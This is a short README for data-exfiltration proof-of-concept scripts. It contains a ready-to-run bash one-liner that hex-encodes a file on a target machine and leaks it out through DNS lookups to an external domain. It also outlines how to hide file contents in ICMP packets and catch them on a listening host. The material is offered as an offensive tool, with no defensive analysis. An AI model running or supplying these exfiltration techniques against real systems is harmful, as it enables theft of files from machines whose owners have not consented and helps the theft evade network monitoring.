# Data Exfiltration PoC Scripts

## DNS Exfliltration (dns_catch.py)
Run dns_catch.py on your DNS server.

On target system execute via bash:
file="secretz.tgz"; key="moo"; domain="sensepost.com" i=1; md=$(cat $file| md5sum| cut -d " " -f 1); len=$((`xxd -p $file |wc -l`)); for h in `cat $file | xxd -p`; do host $h.0.$i.$len.$key.$domain; i=$(($i+1));done; host $md.1.$i.$len.$key.$domain

## ICMP (icmp_shover.py)
### Sending:
Read n bytes of file
Convert to hex
Create ICMP() packet with destination / source headers
Pack ICMP() data section with the hex
Drop it onto the wire!

### Receving:
Listen on network interface for icmp packets (with a little signature)
Unpack from data and write to file



